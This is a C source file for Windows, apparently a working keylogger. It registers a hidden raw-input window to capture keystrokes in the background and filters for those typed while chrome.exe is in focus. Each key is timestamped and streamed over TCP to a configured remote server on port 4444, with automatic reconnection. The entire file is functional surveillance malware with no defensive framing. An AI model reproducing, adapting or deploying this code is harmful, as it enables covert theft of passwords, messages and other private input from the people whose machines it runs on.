#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <ws2tcpip.h>
#include <psapi.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "psapi.lib")

/* ================= CONFIG ================= */

#define TARGET_PROCESS "chrome.exe"   // change as needed
#define SERVER_IP     "192.168.1.0"
#define SERVER_PORT   4444

#define BASE_RETRY_DELAY 2000   // ms
#define MAX_RETRY_DELAY 30000   // ms

/* ================= GLOBALS ================= */

SOCKET g_sock;
static volatile int connected = 0;

/* ================= TCP ================= */

int tcp_connect() {
    WSADATA wsa;
    struct sockaddr_in server;

    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0)
        return 0;

    g_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (g_sock == INVALID_SOCKET)
        return 0;

    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &server.sin_addr);

    if (connect(g_sock, (struct sockaddr*)&server, sizeof(server)) < 0)
        return 0;

    printf("[+] Connected to %s:%d\n", SERVER_IP, SERVER_PORT);
    return 1;
}

void connect_with_retry() {
    int attempt = 0;

    while (!connected) {
        if (tcp_connect()) {
            return;
        }

        printf("Failed connection. Attempt: %d\n", attempt);

        int backoff = BASE_RETRY_DELAY * (1 << attempt);
        if (backoff > MAX_RETRY_DELAY)
            backoff = MAX_RETRY_DELAY;

        Sleep(backoff);

        attempt++;
    }
}

void tcp_send(const char* msg) {
    send(g_sock, msg, (int)strlen(msg), 0);
}

/* ================= TIME ================= */

void get_timestamp(char* out, size_t size) {
    FILETIME ft;
    SYSTEMTIME st;
    GetSystemTimePreciseAsFileTime(&ft);
    FileTimeToSystemTime(&ft, &st);

    snprintf(out, size,
        "%04d-%02d-%02dT%02d:%02d:%02d.%03dZ",
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond, st.wMilliseconds
    );
}

/* ================= FOCUS FILTER ================= */

int get_foreground_process(char* out, size_t size) {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return 0;

    DWORD pid;
    GetWindowThreadProcessId(hwnd, &pid);

    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProc) return 0;

    GetModuleBaseNameA(hProc, NULL, out, (DWORD)size);
    CloseHandle(hProc);
    return 1;
}

/* ================= KEY MAPPING ================= */

const char* special_key_name(UINT vk) {
    switch (vk) {
        case VK_BACK:   return "BACKSPACE";
        case VK_RETURN: return "ENTER";
        case VK_TAB:    return "TAB";
        case VK_ESCAPE: return "ESC";
        case VK_LEFT:   return "LEFT";
        case VK_RIGHT:  return "RIGHT";
        case VK_UP:     return "UP";
        case VK_DOWN:   return "DOWN";
        case VK_DELETE: return "DELETE";
        default: return NULL;
    }
}

/* ================= RAW INPUT ================= */

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {

    if (msg == WM_INPUT) {
        UINT size = 0;
        GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &size, sizeof(RAWINPUTHEADER));

        BYTE* buf = (BYTE*)malloc(size);
        if (!buf) return 0;

        if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, buf, &size,
                            sizeof(RAWINPUTHEADER)) == size) {

            RAWINPUT* raw = (RAWINPUT*)buf;
            if (raw->header.dwType == RIM_TYPEKEYBOARD) {
                RAWKEYBOARD kb = raw->data.keyboard;

                if (!(kb.Flags & RI_KEY_BREAK)) {  // key DOWN only
                    char proc[256] = {0};
                    char ts[64];
                    char msgout[512];

                    if (!get_foreground_process(proc, sizeof(proc)))
                        goto done;

                    if (_stricmp(proc, TARGET_PROCESS) != 0)
                        goto done;

                    get_timestamp(ts, sizeof(ts));

                    const char* sk = special_key_name(kb.VKey);
                    if (sk) {
                        snprintf(msgout, sizeof(msgout),
                            "%s|%s|SPECIAL|%s\n",
                            ts, proc, sk
                        );
                        tcp_send(msgout);
                    } else {
                        BYTE ks[256];
                        WCHAR wbuf[4];

                        GetKeyboardState(ks);
                        int n = ToUnicodeEx(
                            kb.VKey, kb.MakeCode,
                            ks, wbuf, 3, 0,
                            GetKeyboardLayout(0)
                        );

                        if (n > 0) {
                            char utf8[8];
                            WideCharToMultiByte(CP_UTF8, 0, wbuf, n,
                                                utf8, sizeof(utf8), NULL, NULL);
                            utf8[n] = 0;

                            snprintf(msgout, sizeof(msgout),
                                "%s|%s|KEY|%s\n",
                                ts, proc, utf8
                            );
                            tcp_send(msgout);
                        }
                    }
                }
            }
        }
done:
        free(buf);
    }

    return DefWindowProc(hwnd, msg, wParam, lParam);
}

/* ================= MAIN ================= */

int main() {

    connect_with_retry();

    WNDCLASS wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = "RawInputHidden";

    RegisterClass(&wc);

    HWND hwnd = CreateWindow(
        "RawInputHidden", "hidden",
        WS_OVERLAPPEDWINDOW,
        0,0,0,0,
        NULL, NULL, wc.hInstance, NULL
    );

    RAWINPUTDEVICE rid = {
        0x01,   // Generic Desktop
        0x06,   // Keyboard
        RIDEV_INPUTSINK,
        hwnd
    };

    RegisterRawInputDevices(&rid, 1, sizeof(rid));

    printf("[*] Streaming framed keyboard events (target: %s)\n", TARGET_PROCESS);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        DispatchMessage(&msg);
    }

    closesocket(g_sock);
    WSACleanup();
    return 0;
}
